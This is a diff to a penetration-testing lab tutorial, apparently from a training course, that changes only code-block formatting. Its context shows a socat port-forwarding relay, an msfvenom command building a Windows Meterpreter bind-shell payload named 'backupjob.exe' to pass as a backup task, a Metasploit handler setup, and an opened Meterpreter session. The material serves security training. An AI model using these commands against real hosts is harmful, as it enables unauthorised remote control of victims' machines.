@@ -6,13 +6,13 @@ Similar to our socat's reverse shell redirector, we can also create a socat bind
 ## Starting Socat listener
 We can start a socat bind shell listener, which listens on port `8080` and forwards packets to Windows server `8443`.
 
-```sh
+```shellsession
 ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
 ```
 
 ## Creating the Windows Payload
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -26,7 +26,7 @@ Saved as: backupjob.exe
 ## Configuring & Starting the multi/handler
 Finally, we can start a Metasploit bind handler. This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
 
-```sh
+```shellsession
 msf6 > use exploit/multi/handler
 
 [*] Using configured payload generic/shell_reverse_tcp
@@ -45,7 +45,7 @@ We can test this by running our payload on the windows host again, and we should
 
 ## Establishing the Meterpreter Session
 
-```sh
+```shellsession
 [*] Sending stage (200262 bytes) to 10.129.202.64
 [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
 
